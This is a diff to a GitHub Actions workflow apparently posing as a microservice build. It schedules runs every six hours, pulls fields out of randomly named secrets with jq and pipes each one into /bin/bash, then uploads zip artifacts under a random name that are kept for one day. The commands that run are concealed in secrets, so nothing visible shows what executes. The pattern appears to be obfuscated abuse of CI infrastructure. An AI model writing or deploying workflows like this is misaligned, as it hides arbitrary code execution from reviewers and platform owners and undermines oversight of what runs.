@@ -1,10 +1,9 @@
 name: lisamicroservice207
-
 on:
   workflow_dispatch:
-  schedule:
-    - cron: '50 5/6 * * *'
 
+  schedule:
+    - cron: '16 0,6,12,18 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -12,12 +11,15 @@ jobs:
       - uses: actions/checkout@v4
       - name: lisamicroservice207
         env:
-          csg400: ${{ secrets.csg400 }}
+          sams4280: ${{ secrets.sams4280 }}
         run: |
-          echo $csg400 | jq -r .o2488 | /bin/bash
-          echo $ifx5855 | jq -r .gmgf8267 | /bin/bash
-          echo $upwoq39 | jq -r .e691 | /bin/bash
-          echo $hda99848 | jq -r .ndvd71641 | /bin/bash
-          echo $jas85 | jq -r .fpbbv429 | /bin/bash
-          echo $xhap3170 | jq -r .rgu3 | /bin/bash
+          printf '%s' "$sams4280" | jq -r .ltm75 | /bin/bash
+          echo $qhugf0709 | jq -r .bgljb6 | /bin/bash
+          printf '%s' "$kpvx2" | jq -r .cng43 | /bin/bash
 
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: yx1sIXeZ
+          path: "*.zip"
+          retention-days: 1
